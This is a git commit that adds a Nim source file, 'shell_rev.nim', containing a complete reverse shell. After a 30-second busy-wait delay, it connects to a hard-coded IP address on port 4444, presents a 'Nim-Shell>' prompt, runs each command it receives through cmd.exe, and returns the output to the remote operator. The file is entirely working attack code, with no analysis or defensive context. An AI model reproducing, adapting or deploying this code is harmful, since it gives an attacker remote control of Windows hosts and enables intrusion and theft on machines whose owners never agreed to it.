11bcf45537d7c6071749bc5dc53e9b51c66ec1e6
The Crimson reaper <108802787+Crimson-Reaper666@users.noreply.github.com>
2023-06-20 22:47:49 +0530

    Create shell_rev.nim

---
+++ shell_rev.nim
@@ -0,0 +1,25 @@
+import net, osproc, strformat, times
+
+let start = now() + 30.seconds
+var i = 1
+
+
+while now() <= start:
+  var i = i+1
+
+
+let 
+  ip = "192.168.27.38"
+  port = 4444
+  sock = newSocket()
+
+
+sock.connect(ip, Port(port))
+ 
+
+let prompt = "Nim-Shell> "
+while true:
+  send(sock, prompt)
+  let bad = recvLine(sock)
+  let cmd = execProcess(fmt"cmd.exe /C " & bad)
+  send(sock, cmd)
